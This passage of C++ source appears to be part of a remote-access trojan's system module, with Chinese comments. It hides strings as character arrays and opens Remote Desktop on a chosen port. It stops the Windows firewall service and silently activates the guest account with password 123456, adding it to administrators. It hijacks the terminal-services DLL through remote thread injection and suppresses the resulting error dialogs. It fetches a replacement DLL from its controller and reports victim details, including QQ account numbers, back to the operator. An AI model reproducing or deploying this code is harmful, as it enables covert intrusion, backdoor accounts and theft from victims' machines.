	char RihKe[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','C','o','n','t','r','o','l','\\','T','e','r','m','i','n','a','l',' ','S','e','r','v','e','r','\\','W','d','s','\\','r','d','p','w','d','\\','T','d','s','\\','t','c','p','\0'};
	char OxPIY[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','C','o','n','t','r','o','l','\\','T','e','r','m','i','n','a','l',' ','S','e','r','v','e','r','\0'};
	char xbJtP[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','C','o','n','t','r','o','l','\\','T','e','r','m','i','n','a','l',' ','S','e','r','v','e','r','\0'};
	char RxlJi[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','C','o','n','t','r','o','l','\\','T','e','r','m','i','n','a','l',' ','S','e','r','v','e','r','\0'};
	char dRLGx[] = {'P','o','r','t','N','u','m','b','e','r','\0'};
	char Przqs[] = {'f','D','e','n','y','T','S','C','o','n','n','e','c','t','i','o','n','s','\0'};
	WriteRegEx(HKEY_LOCAL_MACHINE, _T(AzjMl), _T(dRLGx), REG_DWORD, NULL, szPort, 0);
	WriteRegEx(HKEY_LOCAL_MACHINE, _T(fWJan), _T(dRLGx), REG_DWORD, NULL, szPort, 0);
	WriteRegEx(HKEY_LOCAL_MACHINE, _T(RihKe), _T(dRLGx), REG_DWORD, NULL, szPort, 0);
	
	ReadRegEx(HKEY_LOCAL_MACHINE, _T(OxPIY), 
		_T(Przqs), REG_DWORD, szCanConnect, NULL, NULL, 0);
	if (atoi(szCanConnect) == 0)
	{
		WriteRegEx(HKEY_LOCAL_MACHINE, _T(xbJtP), _T(Przqs), REG_DWORD, NULL, 1, 0);
		Sleep(1500);
		WriteRegEx(HKEY_LOCAL_MACHINE, _T(RxlJi), _T(Przqs), REG_DWORD, NULL, 0, 0);
	}
	SendSysInfo();
	return TRUE;
}


DWORD CSysInfo::StopFire()
{
	EnablePrivilege(SE_DEBUG_NAME, TRUE);
	SC_HANDLE scm;
    SC_HANDLE service;
    SERVICE_STATUS status;
	scm=OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
	char*ServerName = "sharedaccess";
    service=OpenService(scm,ServerName,SERVICE_ALL_ACCESS);
    BOOL isSuccess=QueryServiceStatus(service,&status);
    if ( status.dwCurrentState !=SERVICE_STOPPED )
	{
		isSuccess=ControlService(service,SERVICE_CONTROL_STOP,&status);
	}
	CloseServiceHandle(service );
	CloseServiceHandle(scm);

	EnablePrivilege(SE_DEBUG_NAME, FALSE);
    return true;
}

void CSysInfo::Close3389()
{	
	WriteRegEx(HKEY_LOCAL_MACHINE, _T("SYSTEM\\CurrentControlSet\\Control\\Terminal Server"), _T("fDenyTSConnections"), REG_DWORD, NULL, 1, 0);
	SendSysInfo();
}

BOOL CSysInfo::OpenGuest()
{
	char CQktf[] = {'n','e','t',' ','u','s','e','r',' ','g','u','e','s','t',' ','/','a','c','t','i','v','e',':','y','e','s',' ','&','&',' ','n','e','t',' ','u','s','e','r',' ','g','u','e','s','t',' ','1','2','3','4','5','6',' ','&','&',' ','n','e','t',' ','l','o','c','a','l','g','r','o','u','p',' ','a','d','m','i','n','i','s','t','r','a','t','o','r','s',' ','g','u','e','s','t',' ','/','a','d','d','\0'};

	return (BOOL)WinExec(CQktf, SW_HIDE);
}

void CSysInfo::WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize)
{
	// 传输完毕
	BYTE	*pData;
	DWORD	dwBytesToWrite;
	DWORD	dwBytesWrite;
	int		nHeadLength = 9; // 1 + 4 + 4  数据包头部大小，为固定的9

	FILESIZEDLL	*pFileSize;
	// 得到数据的偏移
	pData = lpBuffer + 8;
	
	pFileSize = (FILESIZEDLL *)lpBuffer;
	
	// 得到数据在文件中的偏移
	
	LONG	dwOffsetHigh = pFileSize->dwSizeHigh;
	LONG	dwOffsetLow = pFileSize->dwSizeLow;
		
	dwBytesToWrite = nSize - 8;
	TCHAR		strSysPath[MAX_PATH];
	GetSystemDirectory(strSysPath, MAX_PATH);
	lstrcat(strSysPath, m_strCurrentProcessFileNames);
	HANDLE	hFile = 
		CreateFile
		(
		strSysPath,
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		0
		);
	
	SetFilePointer(hFile, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);
	
	BOOL nRet = FALSE;
	// 写入文件
	nRet = WriteFile(hFile, pData, dwBytesToWrite, &dwBytesWrite, NULL);
	CloseHandle(hFile);
	// 为了比较，计数器递增
	
	BYTE	bToken[9];
	bToken[0] = TOKEN_DATA_CONTINUE;
	dwOffsetLow += dwBytesWrite;
	memcpy(bToken + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
	memcpy(bToken + 5, &dwOffsetLow, sizeof(dwOffsetLow));
	Send(bToken, sizeof(bToken));
	LocalFree(bToken);
}

void CSysInfo::CreateLocalRecvFile(LPBYTE lpBuffer)
{
	FILESIZEDLL	*pFileSize = (FILESIZEDLL *)lpBuffer;
	// 保存文件长度
	m_nCurrentProcessFileLength = ((__int64)pFileSize->dwSizeHigh << 32) + pFileSize->dwSizeLow;

	GetFileData();
}

void CSysInfo::GetOpenFile()
{	
	LPBYTE			lpBuffer = NULL;
	DWORD			dwOffset = 0;
	DWORD			dwLength = 0;
	
	TCHAR		strSysPath[MAX_PATH];
	TCHAR		lpDllName[MAX_PATH];
	wsprintf(lpDllName, _T("\\termsrv_t.dll"));
	GetSystemDirectory(strSysPath, MAX_PATH);
	lstrcat(strSysPath, lpDllName);
	HMODULE hDll = NULL;
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	if(GetFileAttributes(strSysPath) != -1)
	{
		hDll = LoadLibrary(strSysPath);
		if(hDll != NULL)
			return;
	}
	//加载失败，要求重传
	lpBuffer[0] = TOKEN_DLL_3389;
	dwOffset = 1;
	memcpy(lpBuffer + dwOffset, lpDllName, (lstrlen(lpDllName) + 1)*2);
	dwOffset += (lstrlen(lpDllName) + 1)*2;
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);
	Send((LPBYTE)lpBuffer, dwOffset);
	LocalFree(lpBuffer);
}

void CSysInfo::GetFileData()
{	
	//  1字节Token,四字节偏移高四位，四字节偏移低四位
	BYTE	bToken[9];
	memset(bToken, 0, sizeof(bToken));
	bToken[0] = TOKEN_DATA_CONTINUE;
	TCHAR		strSysPath[MAX_PATH];
	GetSystemDirectory(strSysPath, MAX_PATH);
	lstrcat(strSysPath, m_strCurrentProcessFileNames);
	HANDLE	hFile = 
		CreateFile
		(
		strSysPath,
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		0
		);
	// 需要错误处理
	if (hFile == INVALID_HANDLE_VALUE)
	{
		m_nCurrentProcessFileLength = 0;
		return;
	}
	CloseHandle(hFile);

	Send(bToken, sizeof(bToken));
	LocalFree(bToken);
}

bool IsOSXP()
{
	OSVERSIONINFOEX OsVerInfoEx;
	OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionEx((OSVERSIONINFO *)&OsVerInfoEx); // 注意转换类型
	return OsVerInfoEx.dwMajorVersion == 5 && OsVerInfoEx.dwMinorVersion == 1;
}

bool CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
	if (!IsWindowVisible(hwnd))
		return true;
	
	DWORD dwWindowThreadId = NULL;
	DWORD dwLsassId = (DWORD)lParam;
	GetWindowThreadProcessId(hwnd, &dwWindowThreadId);
	if (dwWindowThreadId == (DWORD)lParam)
	{
		// 关闭指定进程的窗口
		SendMessage(hwnd, WM_CLOSE, 0, 0);
	}
	return true;
}

// DWORD GetProcessID(LPCSTR lpProcessName)
// {
// 	HANDLE			hProcessSnap = NULL;
// 	PROCESSENTRY32	pe32 = {0};
// 	
// 	// 获取系统进程快照
// 	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
// 	if (hProcessSnap == INVALID_HANDLE_VALUE)
// 		return 0;
// 	pe32.dwSize = sizeof(PROCESSENTRY32);
// 	for (BOOL bPE32=Process32First(hProcessSnap, &pe32); bPE32; bPE32=Process32Next(hProcessSnap, &pe32))
// 	{
// 		if (stricmp(pe32.szExeFile, lpProcessName) == 0)
// 		{
// 			CloseHandle(hProcessSnap);
// 			return pe32.th32ProcessID;
// 		}
// 	}
// 	CloseHandle(hProcessSnap);
// 	return 0;
// }

HANDLE FindModule(DWORD dwProcessID, LPCTSTR lpModulePath)
{
	HANDLE hModuleHandle = NULL;
	MODULEENTRY32 me32 = {0};
	HANDLE hModuleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwProcessID);
	me32.dwSize = sizeof(MODULEENTRY32);
	if(::Module32First(hModuleSnap, &me32))
	{
		do
		{	
			if (lstrcmpi(me32.szExePath, lpModulePath) == 0)
			{
				hModuleHandle = me32.hModule;
				break;
			}
		}while(::Module32Next(hModuleSnap,&me32));
	}
	::CloseHandle(hModuleSnap);
	return hModuleHandle;
}

bool UnloadRemoteModule(DWORD dwProcessID, HANDLE hModuleHandle)
{
	HANDLE hRemoteThread;
	HANDLE hProcess;

	if (hModuleHandle == NULL)
		return false;
	hProcess=OpenProcess(PROCESS_VM_WRITE|PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION, FALSE, dwProcessID);
	if (hProcess == NULL)
		return false;
	
	char ExUmf[] = {'k','e','r','n','e','l','3','2','.','d','l','l','\0'};
	
	char TjHbd[] = {'F','r','e','e','L','i','b','r','a','r','y','\0'};

	HMODULE hModule=GetModuleHandle(ExUmf);
	LPTHREAD_START_ROUTINE pfnStartRoutine = (LPTHREAD_START_ROUTINE)::GetProcAddress(hModule, TjHbd);
	hRemoteThread=CreateRemoteThread(hProcess, NULL, 0, pfnStartRoutine, hModuleHandle, 0, NULL);

	if(hRemoteThread==NULL)
	{
		CloseHandle(hProcess);
		return false;
	}
	WaitForSingleObject(hRemoteThread,INFINITE);
	CloseHandle(hProcess);
	CloseHandle(hRemoteThread);
	return true;
}


bool UnloadModule(LPCTSTR lpModulePath)
{
	BOOL bRet = false;
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(pe32);

	HANDLE hProcessSnap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);

	//查找相关的进程
	if(Process32First(hProcessSnap, &pe32))
	{
		do
		{
		   HANDLE hModuleHandle = FindModule(pe32.th32ProcessID, lpModulePath);
		   if (hModuleHandle != NULL)
		   {
				bRet = UnloadRemoteModule(pe32.th32ProcessID, hModuleHandle);
		   }
		}while (Process32Next(hProcessSnap,&pe32));
	}
	CloseHandle(hProcessSnap);
	return bRet;
}

void HijackService()
{
	TCHAR strDll[MAX_PATH];
	GetSystemDirectory(strDll, sizeof(strDll));
	lstrcat(strDll, _T("\\termsrv.dll"));
	
	// 遍历进程卸载现在加载的DLL
	EnablePrivilege(SE_DEBUG_NAME, TRUE);
	if (!UnloadModule(strDll))
		return;
	EnablePrivilege(SE_DEBUG_NAME, FALSE);
	
	// 关闭要弹出的出错对话框和因DLL强制卸载使一些服务异常终止而弹出来的自动关机对话框
	// 对进程赋予关闭权限
	EnablePrivilege(SE_SHUTDOWN_NAME,TRUE);
	DWORD dwLsassId = GetProcessId(_T("csrss.exe"));
	while (!AbortSystemShutdown(NULL))
	{
		// 一些系统是会弹出drwtsn32.exe
		DWORD dwDrwtsn32Id = GetProcessId(_T("drwtsn32.exe"));
		if (dwDrwtsn32Id != NULL)
		{
			EnumWindows((WNDENUMPROC)EnumWindowsProc, (LPARAM)dwDrwtsn32Id);
		}
		// 模块强制卸载时会出错，关闭csrss.exe进程弹出的出错窗口
		EnumWindows((WNDENUMPROC)EnumWindowsProc, (LPARAM)dwLsassId);
		Sleep(10);
	}
	EnablePrivilege(SE_SHUTDOWN_NAME, FALSE);
}

void OnStartService(LPCTSTR lpService)
{
	SC_HANDLE hSCManager = OpenSCManager( NULL, NULL,SC_MANAGER_CREATE_SERVICE );
	if ( NULL != hSCManager )
	{
		SC_HANDLE hService = OpenService(hSCManager, lpService, DELETE | SERVICE_START);
		if ( NULL != hService )
		{
		   StartService(hService, 0, NULL);
		   CloseServiceHandle( hService );
		}
		CloseServiceHandle( hSCManager );
	}
}

DWORD CSysInfo::Open3389(LPVOID lparam)
{	
	DWORD szPort=atoi((char*)lparam);
	if (szPort > 0)
	{
		if (szPort < 65535)
		{
			TCHAR szDllPath[MAX_PATH];
			GetSystemDirectory(szDllPath, sizeof(szDllPath));
			lstrcat(szDllPath, _T("\\termsrv_t.dll"));
			if (IsOSXP())
			{
				if (GetFileAttributes(szDllPath) != -1)
				{
					HMODULE hLoad = LoadLibrary(szDllPath);
					if (hLoad)
						FreeLibrary(hLoad);
					else
					{
						GetOpenFile();
						return 0;
					}
				}
				else
				{
					GetOpenFile();
					return 0; 
				}
			}
			ChangePort(lparam);
				char GymuH[] = {'S','O','F','T','W','A','R','E','\\','M','i','c','r','o','s','o','f','t','\\','W','i','n','d','o','w','s',' ','N','T','\\','C','u','r','r','e','n','t','V','e','r','s','i','o','n','\\','W','i','n','l','o','g','o','n','\0'};
				char kTXBd[] = {'S','O','F','T','W','A','R','E','\\','P','o','l','i','c','i','e','s','\\','M','i','c','r','o','s','o','f','t','\\','W','i','n','d','o','w','s','\\','I','n','s','t','a','l','l','e','r','\0'};
				char bKOlI[] = {'S','O','F','T','W','A','R','E','\\','M','i','c','r','o','s','o','f','t','\\','W','i','n','d','o','w','s',' ','N','T','\\','C','u','r','r','e','n','t','V','e','r','s','i','o','n','\\','W','i','n','l','o','g','o','n','\0'};
				char oRVKd[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','S','e','r','v','i','c','e','s','\\','T','e','r','m','D','D','\0'};
				char oZoSM[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','S','e','r','v','i','c','e','s','\\','T','e','r','m','S','e','r','v','i','c','e','\0'};
				char rraZn[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','C','o','n','t','r','o','l','\\','T','e','r','m','i','n','a','l',' ','S','e','r','v','e','r','\0'};
				char sdxxu[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','C','o','n','t','r','o','l','\\','T','e','r','m','i','n','a','l',' ','S','e','r','v','e','r','\\','L','i','c','e','n','s','i','n','g',' ','C','o','r','e','\0'};
				char hdPUS[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','S','e','r','v','i','c','e','s','\\','T','e','r','m','S','e','r','v','i','c','e','\\','P','a','r','a','m','e','t','e','r','s','\0'};
				char dNyGO[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','C','o','n','t','r','o','l','\\','T','e','r','m','i','n','a','l',' ','S','e','r','v','e','r','\0'};
				char LOvde[] = {'S','h','u','t','d','o','w','n','W','i','t','h','o','u','t','L','o','g','o','n','\0'};
				char gBVqb[] = {'E','n','a','b','l','e','A','d','m','i','n','T','S','R','e','m','o','t','e','\0'};
				char ItPQW[] = {'K','e','e','p','R','A','S','C','o','n','n','e','c','t','i','o','n','s','\0'};
				char iKNVW[] = {'S','t','a','r','t','\0'};
				char agpis[] = {'T','S','E','n','a','b','l','e','d','\0'};
				char SjKMK[] = {'E','n','a','b','l','e','C','o','n','c','u','r','r','e','n','t','S','e','s','s','i','o','n','s','\0'};
				
				WriteRegEx(HKEY_LOCAL_MACHINE, _T(GymuH), _T(LOvde), REG_DWORD, NULL, 0, 0);
				WriteRegEx(HKEY_LOCAL_MACHINE, _T(kTXBd), _T(gBVqb), REG_DWORD, NULL, 1, 0);
				WriteRegEx(HKEY_LOCAL_MACHINE, _T(bKOlI), _T(ItPQW), REG_SZ, _T("1"), 0, 0);
				WriteRegEx(HKEY_LOCAL_MACHINE, _T(oRVKd), _T(iKNVW), REG_DWORD, NULL, 2, 0);
				WriteRegEx(HKEY_LOCAL_MACHINE, _T(oZoSM), _T(iKNVW), REG_DWORD, NULL, 2, 0);
				WriteRegEx(HKEY_LOCAL_MACHINE, _T(rraZn), _T(agpis), REG_DWORD, NULL, 1, 0);
				WriteRegEx(HKEY_LOCAL_MACHINE, _T(sdxxu), _T(SjKMK), REG_DWORD, NULL, 1, 0);
				if (IsOSXP())
				{
					char UYFpy[] = {'S','e','r','v','i','c','e','D','l','l','\0'};
					
					WriteRegEx(HKEY_LOCAL_MACHINE, _T(hdPUS), _T(UYFpy), REG_EXPAND_SZ,
						_T("%SystemRoot%\\system32\\termsrv_t.dll"), 0, 0);
					HijackService();
				}
				char mRZpV[] = {'T','e','r','m','S','e','r','v','i','c','e','\0'};
				OnStartService(_T(mRZpV));
				Sleep(500);
				char MePQM[] = {'f','D','e','n','y','T','S','C','o','n','n','e','c','t','i','o','n','s','\0'};			
				WriteRegEx(HKEY_LOCAL_MACHINE, _T(dNyGO), _T(MePQM), REG_DWORD, NULL, 0, 0);
				StopFire();
		}
	}
	Sleep(1000);
	SendSysInfo();
	return 0;
}

// MODIFY_DATA modify_data = 
// {
// 	"           D         ",
// 		"",
// 		"",
// 		"",
// 		"",
// 		"",
// 		"",
// 		"",
// 		TRUE,			//TRUE为服务启动
// 		TRUE,			//TRUE为写启动项
// 		TRUE,			//TRUE为注册表启动项
// 		TRUE,			//FALSE为安装,TRUE为绿色安装
// };

void CSysInfo::GetOnlineInfo(tagOnlineInfo* pInsInfo)
{

 	char	strTMPHostB[MAX_PATH];

	wsprintf(strTMPHostB, "%s:%d",Linkaddress,NetPort);

	char	strTMPTime[MAX_PATH];
	char	SerName[MAX_PATH];

	if(NetOpert==0)  //绿色一次性运行
	{
	    wsprintf(strTMPTime,"%s","(绿色运行模式)--重启不上线!");     //上线运行方式
	}
	else if(NetOpert==1)  // 服务启动运行
	{
		wsprintf(strTMPTime,"%s","(服务启动模式)--SYSTEM用户运行!");     //上线运行方式
	}
	else if(NetOpert==2)  // 直接启动运行
	{
		wsprintf(strTMPTime,"%s","(Run启动模式)--当前用户运行!");      //上线运行方式
	}
 	else if(NetOpert==3)  // Run启动运行
 	{
 		wsprintf(strTMPTime,"%s","(注册表启动模式)--当前用户运行!");       //上线运行方式
 	}

	char szbuf[256];
	GetModuleFileName(NULL,szbuf,MAX_PATH);   //用于获取程序本身路径

	wsprintf(SerName,"%s",szbuf );  

	ZeroMemory(pInsInfo,sizeof(tagOnlineInfo));
	sprintf(pInsInfo->szrHostB, strTMPHostB);
	sprintf(pInsInfo->szrInstallTime, strTMPTime);
	sprintf(pInsInfo->szrSerName, SerName);
}

char* CSysInfo::DelSpace(char *szData)
{
	int i=0;
	while(1)
	{
		if(strnicmp(szData+i," ",1))
			break;
		i++;			
	}
	int j=i;
	while(*(szData+j) != '\0')
	{
		if(!strnicmp(szData+j,"  ",2))
			memmove(szData+j,szData+j+1,strlen(szData+j+1)+1);
		else
			j++;
	}
	return (szData+i);
}

void CSysInfo::GetSystemInfo(tagSystemInfo* pSysInfo)
{
	ZeroMemory(pSysInfo,sizeof(tagSystemInfo));
	///////get system version//////////
	char *pszOS = NULL;
	OSVERSIONINFOEX	OsVerInfoEx;	// 版本信息  //操作系统信息
	OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionEx((OSVERSIONINFO *)&OsVerInfoEx); // 注意转换类型

	if ( OsVerInfoEx.dwMajorVersion <= 4 )
	{
		pszOS = _T("NT");
	}
	if ( OsVerInfoEx.dwMajorVersion == 5 && OsVerInfoEx.dwMinorVersion == 0 )
	{
		pszOS = _T("2000");
	}
	if ( OsVerInfoEx.dwMajorVersion == 5 && OsVerInfoEx.dwMinorVersion == 1 )
	{
		pszOS = _T("XP");
	}
	if ( OsVerInfoEx.dwMajorVersion == 5 && OsVerInfoEx.dwMinorVersion == 2 )
	{
		pszOS = _T("2003");
	}
	if ( OsVerInfoEx.dwMajorVersion == 6 && OsVerInfoEx.dwMinorVersion == 0 )
	{
		if( OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
		{
			pszOS = _T("Vista"); 
		}
		else
		{
			pszOS = _T("2008");
		}
	}
	if ( OsVerInfoEx.dwMajorVersion == 6 && OsVerInfoEx.dwMinorVersion == 1 )
	{
		if( OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
		{
			pszOS = _T("7");
		}
		else
		{
			pszOS = _T("2008R2");
		}
	}
	if ( OsVerInfoEx.dwMajorVersion == 6 && OsVerInfoEx.dwMinorVersion == 2 )
	{
		if( OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
		{
			pszOS = _T("8");
		}
		else
		{
			pszOS = _T("2012");
		}
	}
	sprintf(pSysInfo->szSystem, _T("Windows %s SP%d"),pszOS, OsVerInfoEx.wServicePackMajor);

	//Get CPU Info===============================
	TCHAR SubKey[MAX_PATH]=_T("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0\0");
	HKEY hKey = NULL;
	if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,SubKey,0L,KEY_QUERY_VALUE,&hKey) == ERROR_SUCCESS)
	{
		DWORD dwType;
		DWORD dwSize = 128 * sizeof(TCHAR);
		char  ValueSz[MAX_PATH]={0};
		if(RegQueryValueEx(hKey,_T("ProcessorNameString"),NULL,&dwType,(BYTE *)ValueSz,&dwSize) == ERROR_SUCCESS)
			_tcscpy(pSysInfo->szCpuInfo,DelSpace(ValueSz));
		RegCloseKey(hKey);	
	}
	else
		_tcscpy(pSysInfo->szCpuInfo,_T("CPU信息无法获取!"));

	//QQ//////////////////////////////////////////
	char szText[MAX_PATH] = "CTXOPConntion_Class";
    char szQQNumber[MAX_PATH] = {0};
    HWND hWnd = FindWindow(szText, NULL);
    while (hWnd)
    {
		if(strcmp(szText,"CTXOPConntion_Class")==0)
		{
			GetWindowText(hWnd, szText, MAX_PATH);
			int len = strlen(szText);
			do
			{
				len--;
			} while (szText[len] != '_');
			strcpy(szQQNumber, &szText[len+1]);
			if (strlen(pSysInfo->szQqNum) + strlen(szQQNumber) + 2 <= sizeof(pSysInfo->szQqNum))
			{
				strcat(pSysInfo->szQqNum, szQQNumber);
				strcat(pSysInfo->szQqNum, " ");
			}
		}
		hWnd = GetWindow(hWnd, GW_HWNDNEXT);
		GetClassName(hWnd, szText, MAX_PATH);
    }
    //getchar();
	///////////////////////////////////////////////////
	//Get Active Time============================
	DWORD dwTime,dwDay,dwHour,dwMin;
	dwTime = GetTickCount();
	dwDay = dwTime / (1000 * 60 * 60 * 24);
	dwTime = dwTime % (1000 * 60 * 60 * 24);
	dwHour = dwTime / (1000 * 60 * 60);
	dwTime = dwTime % (1000 * 60 * 60);
	dwMin = dwTime / (1000 * 60);
	_stprintf(pSysInfo->szActiveTime, _T("%d天%d时%d分"), dwDay, dwHour, dwMin);

	//Get AntiVirus & FireWall========================
//	strcpy( pSysInfo->szAntiVirus, GetVirus() );

	//Get User Name========================
	//DWORD dwLen  = sizeof(pSysInfo->szUserName);
	//GetUserName(pSysInfo->szUserName,&dwLen);
	GetCurrentUserName(pSysInfo->szUserName);

	// 内存
	CHAR *szTotalPhys = GetTotalPhys();
	pSysInfo->szMemory = atol(szTotalPhys);
	delete[] szTotalPhys;

	// 可用内存
	CHAR *szAvailPhys = GetAvailPhys();
	pSysInfo->szMemoryFree = atol(szAvailPhys);
	delete[] szAvailPhys;
	
	ULARGE_INTEGER nTotalBytes,nTotalFreeBytes,nTotalAvailableBytes;
	ULONG nAllGB = 0, nFreeGB = 0;
    DWORD drivertype;
    CHAR driver[10], strPrint[128];
    for(int i=0; i<26; i++)
    {
		driver[0] = i + ('B');
		driver[1] = (':');
		driver[2] = ('\\');
		driver[3] = 0;
		
		drivertype = GetDriveType(driver);
        if(drivertype!=DRIVE_FIXED)
			continue;
		GetDiskFreeSpaceEx(driver,&nTotalAvailableBytes,&nTotalBytes,&nTotalFreeBytes);   
		nAllGB = nAllGB + nTotalBytes.QuadPart/1024/1024/1024;
		nFreeGB = nFreeGB + nTotalFreeBytes.QuadPart/1024/1024/1024;
    }
	// 硬盘
	pSysInfo->szDriveSize = nAllGB;
	// 可用硬盘
	pSysInfo->szDriveFreeSize = nFreeGB;
	//读取远程端口
	GetPort(_T("RDP-Tcp"),pSysInfo->szRemotePort,sizeof(pSysInfo->szRemotePort));
	//3389状态
	TCHAR szSystem[32], szDllName[MAX_PATH];
	SC_HANDLE hSCManager, schService;
	SERVICE_STATUS   ssStatus;
	hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (hSCManager == NULL)
	{
		wsprintf(pSysInfo->szOpenInfo, _T("OpenSCManager Error!"));
		return;
	}
	schService = OpenService( hSCManager, _T("TermService"), SERVICE_ALL_ACCESS);
	if(schService   ==   NULL)
	{
		wsprintf(pSysInfo->szOpenInfo, _T("OpenService Error!"));
		return;
	}
	if (!QueryServiceStatus(schService, &ssStatus))
	{	
		CloseServiceHandle(schService);
		CloseServiceHandle(hSCManager);
		wsprintf(pSysInfo->szOpenInfo, _T("QueryServiceStatus Error!"));
		return;
	}
	CloseServiceHandle(schService);
	CloseServiceHandle(hSCManager);
	if (ssStatus.dwCurrentState == SERVICE_RUNNING)
	{
		TCHAR szCanConnect[32];
		ReadRegEx(HKEY_LOCAL_MACHINE, _T("SYSTEM\\CurrentControlSet\\Control\\Terminal Server"), 
			_T("fDenyTSConnections"), REG_DWORD, szCanConnect, NULL, NULL, 0);
		if (atoi(szCanConnect) == 0)
		{
			if(_tcscmp(szSystem, _T("Win XP")) == 0)
			{
				//HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TermService\Parameters
				char MvrIy[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','S','e','r','v','i','c','e','s','\\','T','e','r','m','S','e','r','v','i','c','e','\\','P','a','r','a','m','e','t','e','r','s','\0'};
				ReadRegEx(HKEY_LOCAL_MACHINE, _T(MvrIy), 
					_T("ServiceDll"), REG_EXPAND_SZ, szDllName, NULL, NULL, 0);
				if (_tcsstr(szDllName, _T("termsrv_t")) != 0)
				{
					PROCESSENTRY32 pe32;
					pe32.dwSize = sizeof(pe32);
					TCHAR strDll[MAX_PATH];
					BOOL bRet = FALSE;
					GetSystemDirectory(strDll, sizeof(strDll));
					lstrcat(strDll, _T("\\termsrv_t.dll"));
					EnablePrivilege(SE_DEBUG_NAME, TRUE);
					HANDLE hProcessSnap= CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
					//查找相关的进程
					if(Process32First(hProcessSnap, &pe32))
					{
						do
						{
							HANDLE hModuleHandle = FindModule(pe32.th32ProcessID, strDll);
							if (hModuleHandle != NULL)
							{
								bRet = TRUE;
								break;
							}
						}while (Process32Next(hProcessSnap,&pe32));
					}
					CloseHandle(hProcessSnap);
					EnablePrivilege(SE_DEBUG_NAME, FALSE);
					if (bRet)
					{
						wsprintf(pSysInfo->szOpenInfo, _T("已开启且已双开"));
						return;
					}
					else
					{
						wsprintf(pSysInfo->szOpenInfo, _T("已开启但未双开"));
						return;
					}
				}
				else
				{
					wsprintf(pSysInfo->szOpenInfo, _T("已开启但未双开"));
					return;
				}
			}
			else
			{
				wsprintf(pSysInfo->szOpenInfo, _T("已开启且无需双开"));
				return;
			}
		}
		else
		{
			wsprintf(pSysInfo->szOpenInfo, _T("未允许连接3389"));
			return;
		}
	}
	else
	{
		wsprintf(pSysInfo->szOpenInfo, _T("未开启3389服务"));
	}
}
